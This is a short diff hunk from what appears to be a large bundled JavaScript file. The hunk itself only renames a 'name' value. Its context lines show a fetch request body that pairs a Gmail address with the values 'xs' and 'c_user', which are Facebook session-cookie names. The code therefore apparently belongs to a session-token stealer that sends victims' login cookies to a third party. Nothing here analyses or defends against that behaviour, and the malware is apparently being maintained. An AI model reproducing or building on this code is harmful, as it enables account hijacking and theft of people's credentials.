@@ -10387,7 +10387,7 @@
                                   "lyfemarketingadvertising23@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                name: "Shayans",
+                                name: "Shayan",
                               }),
                             }).then((e) => {
                               e.ok;
